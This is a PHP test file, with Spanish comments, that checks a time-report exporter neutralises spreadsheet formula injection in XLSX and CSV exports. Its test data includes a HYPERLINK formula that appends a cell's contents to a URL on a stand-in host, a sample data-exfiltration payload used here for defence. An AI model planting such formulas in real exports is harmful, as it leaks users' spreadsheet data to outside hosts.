<?php

use App\Domain\Reports\Export\TableExporter;
use App\Models\TimeEntry;
use OpenSpout\Reader\XLSX\Reader as XlsxReader;
use Tests\Feature\Reports\R3Scenario;

/*
| Inyección de fórmulas en las exportaciones (OWASP «CSV Injection»): descripciones, títulos y nombres
| los escriben los usuarios y nunca deben llegar como fórmula a la hoja de cálculo de quien exporta.
| XLSX: siempre texto (ninguna celda <f>). CSV: con un apóstrofo delante si empiezan por = + - @,
| tabulador o retorno de carro. Los números, también los negativos, no se tocan.
*/

beforeEach(function () {
    $this->hyperlink = '=HYPERLINK("https://x.test/?"&A1,"ok")';
    // Contenido de la hoja y valores leídos con OpenSpout.
    $this->sheet = function (string $content): array {
        $path = tempnam(sys_get_temp_dir(), 'r3').'.xlsx';
        file_put_contents($path, $content);
        $zip = new ZipArchive;
        $zip->open($path);
        $xml = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        $reader = new XlsxReader;
        $reader->open($path);
        $rows = [];
        foreach ($reader->getSheetIterator() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                $rows[] = $row->toArray();
            }
        }
        $reader->close();
        unlink($path);

        return ['xml' => $xml, 'rows' => $rows];
    };
});

it('el XLSX escribe como texto lo que empieza por = (también en la cabecera)', function () {
    $path = tempnam(sys_get_temp_dir(), 'r3').'.xlsx';
    app(TableExporter::class)->write($path, ['Descripción', '=cabecera'], [
        ['=1+1', '=> revisar'],
        [$this->hyperlink, '+34 600'],
        ['-guion', '@mención'],
    ], 'xlsx');
    $sheet = ($this->sheet)((string) file_get_contents($path));
    unlink($path);

    expect($sheet['xml'])->not->toContain('<f>')
        ->and($sheet['rows'])->toBe([
            ['Descripción', '=cabecera'],
            ['=1+1', '=> revisar'],
            [$this->hyperlink, '+34 600'],
            ['-guion', '@mención'],
        ]);
});

it('el CSV neutraliza con un apóstrofo los textos que serían fórmula y no toca los números', function () {
    $path = tempnam(sys_get_temp_dir(), 'r3');
    app(TableExporter::class)->write($path, ['=cabecera', 'Horas'], [
        ['=1+1', -2.25],
        ['=> revisar', 1.5],
        ["\tTab", 3],
        ["\rRetorno", -4],
        ['+34 600', true],
        ['-guion', false],
        ['@mención', null],
        ['Normal = sin riesgo', 0.5],
    ], 'csv');
    $lines = explode("\n", trim(substr((string) file_get_contents($path), 3)));
    unlink($path);

    expect($lines[0])->toBe("'=cabecera;Horas")
        ->and($lines[1])->toBe("'=1+1;-2,25")
        ->and($lines[2])->toBe("\"'=> revisar\";1,50")
        ->and($lines[3])->toBe("\"'\tTab\";3")
        ->and($lines[4])->toBe("\"'\rRetorno\";-4")
        ->and($lines[5])->toBe("\"'+34 600\";Sí")
        ->and($lines[6])->toBe("'-guion;No")
        ->and($lines[7])->toBe("'@mención;")
        ->and($lines[8])->toBe('"Normal = sin riesgo";0,50')
        ->and(TableExporter::neutralize('Ajustes'))->toBe('Ajustes')
        ->and(TableExporter::neutralize(''))->toBe('');
});

it('la exportación de horas no convierte en fórmula la descripción de una entrada', function () {
    $s = R3Scenario::build($this);
    TimeEntry::query()->where('description', 'Primera versión')->update(['description' => $this->hyperlink]);
    TimeEntry::query()->where('description', 'Ajustes')->update(['description' => '=> pendiente']);
    $url = '/informes/horas/exportar?'.http_build_query(R3Scenario::week(['proyecto' => [$s->tm->id]]));

    $sheet = ($this->sheet)($this->actingAs($s->admin)->get($url.'&formato=xlsx')->assertOk()->streamedContent());
    $csv = $this->actingAs($s->admin)->get($url.'&formato=csv')->assertOk()->streamedContent();

    expect($sheet['xml'])->not->toContain('<f>')
        ->and(array_column($sheet['rows'], 12))->toEqualCanonicalizing(['Descripción', $this->hyperlink, '=> pendiente'])
        ->and($csv)->toContain("\"'".str_replace('"', '""', $this->hyperlink).'"')
        ->and($csv)->toContain("\"'=> pendiente\"");
});

it('la exportación del detallado no convierte en fórmula las cabeceras de filas ni de columnas', function () {
    $s = R3Scenario::build($this);
    $s->tmTask->update(['title' => $this->hyperlink]);
    $s->ana->update(['name' => '=Ana']);
    $url = fn (string $rows, string $columns): string => '/informes/detalle?'.http_build_query(R3Scenario::week(['filas' => $rows, 'columnas' => $columns, 'departamento' => [$s->design->id]]));

    // Personas en las filas (la primera celda de la fila) y en las columnas (la cabecera).
    foreach ([['persona', 'proyecto'], ['proyecto', 'persona']] as [$rows, $columns]) {
        $sheet = ($this->sheet)($this->actingAs($s->admin)->get($url($rows, $columns).'&formato=xlsx')->assertOk()->streamedContent());
        $csv = $this->actingAs($s->admin)->get($url($rows, $columns).'&formato=csv')->assertOk()->streamedContent();

        expect($sheet['xml'])->not->toContain('<f>')
            ->and($rows === 'persona' ? array_column($sheet['rows'], 0) : $sheet['rows'][0])->toContain('=Ana')
            ->and($csv)->toContain("'=Ana;");
    }

    // Las tareas llevan delante el código de su proyecto: nunca empiezan por «=».
    $sheet = ($this->sheet)($this->actingAs($s->admin)->get($url('tarea', 'persona').'&formato=xlsx')->assertOk()->streamedContent());

    expect($sheet['xml'])->not->toContain('<f>')
        ->and(array_column($sheet['rows'], 0))->toContain('TM · '.$this->hyperlink);
});
